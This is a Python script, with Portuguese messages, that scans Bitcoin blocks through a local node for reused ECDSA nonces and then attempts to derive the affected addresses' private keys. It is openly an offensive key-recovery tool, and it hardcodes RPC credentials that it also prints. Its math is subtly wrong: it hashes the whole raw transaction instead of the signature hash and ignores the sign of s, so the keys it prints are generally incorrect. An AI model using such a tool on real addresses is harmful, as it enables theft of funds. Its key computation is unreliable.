import subprocess
import json
from asn1crypto.algos import DSASignature
from collections import defaultdict
import hashlib
import base58
import argparse
import sys
from sympy import mod_inverse

RPC_USER = "coffnix"
RPC_PASS = "a1b2c3d4e5f6"

r_map = defaultdict(lambda: defaultdict(list))

def pubkey_to_address(pubkey_hex):
    try:
        pubkey_bytes = bytes.fromhex(pubkey_hex)
        sha256_hash = hashlib.sha256(pubkey_bytes).digest()
        ripemd160_hash = hashlib.new('ripemd160')
        ripemd160_hash.update(sha256_hash)
        hashed_pubkey = ripemd160_hash.digest()
        versioned = b'\x00' + hashed_pubkey
        checksum = hashlib.sha256(hashlib.sha256(versioned).digest()).digest()[:4]
        address_bytes = versioned + checksum
        return base58.b58encode(address_bytes).decode('utf-8')
    except Exception:
        return "Erro"

def rpc_call(method, params=[]):
    cmd = ["bitcoin-cli", f"-rpcuser={RPC_USER}", f"-rpcpassword={RPC_PASS}", method] + [str(p) for p in params]
    try:
        result = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        stdout, stderr = result.communicate()
        if result.returncode != 0:
            return None
        stdout = stdout.strip()
        return json.loads(stdout) if stdout.startswith("{") or stdout.startswith("[") else stdout
    except Exception:
        return None

def parse_der(sig_hex):
    try:
        if '[' in sig_hex:
            sig_hex = sig_hex.split('[')[0]
        sig_hex = ''.join(c for c in sig_hex if c in '0123456789abcdefABCDEF')
        sig_bytes = bytes.fromhex(sig_hex)
        try:
            parsed = DSASignature.load(sig_bytes)
        except Exception:
            sig_bytes = sig_bytes[:-1]
            parsed = DSASignature.load(sig_bytes)
        r = int(parsed['r'].native)
        s = int(parsed['s'].native)
        return (r, s)
    except Exception:
        return (None, None)

def scan_block(height):
    block_hash = rpc_call("getblockhash", [height])
    if not block_hash:
        return
    block = rpc_call("getblock", [block_hash, 2])
    if not block:
        return
    for tx in block["tx"]:
        for vin in tx.get("vin", []):
            if "scriptSig" not in vin:
                continue
            asm = vin["scriptSig"].get("asm", "")
            if not asm or " " not in asm:
                continue
            parts = asm.split(" ")
            sig_hex = parts[0]
            pubkey_hex = parts[1] if len(parts) > 1 else None
            if not pubkey_hex:
                continue
            r, s = parse_der(sig_hex)
            if r is None:
                continue
            r_map[pubkey_hex][r].append({"txid": tx["txid"], "s": s, "block": height})

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--range', type=str, required=True)
    args = parser.parse_args()

    try:
        start_str, end_str = args.range.split(':')
        start = int(start_str)
        end = int(end_str)
    except:
        print("Formato inválido para --range. Use: --range 123:456")
        sys.exit(1)

    for h in range(start, end + 1):
        print(f"\033[1mVerificando bloco {h}\033[0m")
        scan_block(h)

    for pubkey, r_dict in r_map.items():
        address = pubkey_to_address(pubkey)
        for r, entries in r_dict.items():
            if len(entries) > 1:
                print("\n" + "#" * 75)
                print(f"\033[1mReuso de r detectado para endereço {address} (pubkey {pubkey}): r = {r}\033[0m")
                for entry in entries:
                    print(f"  bloco = {entry['block']}  txid = {entry['txid']}  s = {entry['s']}")
                try:
                    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
                    s1 = entries[0]['s'] % n
                    s2 = entries[1]['s'] % n
                    tx1 = entries[0]['txid']
                    tx2 = entries[1]['txid']
                    raw1 = rpc_call("getrawtransaction", [tx1, 'false'])
                    raw2 = rpc_call("getrawtransaction", [tx2, 'false'])
                    if raw1 and raw2:
                        z1 = int(hashlib.sha256(bytes.fromhex(raw1)).hexdigest(), 16) % n
                        z2 = int(hashlib.sha256(bytes.fromhex(raw2)).hexdigest(), 16) % n
                        r = r % n
                        rinv = mod_inverse(r, n)
                        sdiff = (s1 - s2) % n
                        sdiff_inv = mod_inverse(sdiff, n)
                        zdiff = (z1 - z2) % n
                        k = (zdiff * sdiff_inv) % n
                        d = ((s1 * k - z1) * rinv) % n
                        print("  \033[1mVerificação matemática de:\033[0m")
                        print(f"  k = ({z1} - {z2}) * inverse({s1} - {s2}) mod n = {k}")
                        print(f"  d = ({s1} * {k} - {z1}) * inverse({r}) mod n = {d}")
                        print("\n\033[1mPara conferir as transações use:\033[0m")
                        for entry in entries:
                            print(f"\033[1mbitcoin-cli -rpcuser=coffnix -rpcpassword=a1b2c3d4e5f6 getrawtransaction {entry['txid']} true\033[0m")
                        print("\n" + "#" * 75)
                except Exception as e:
                    print(f"  Erro ao calcular chave privada: {e}")

if __name__ == "__main__":
    main()
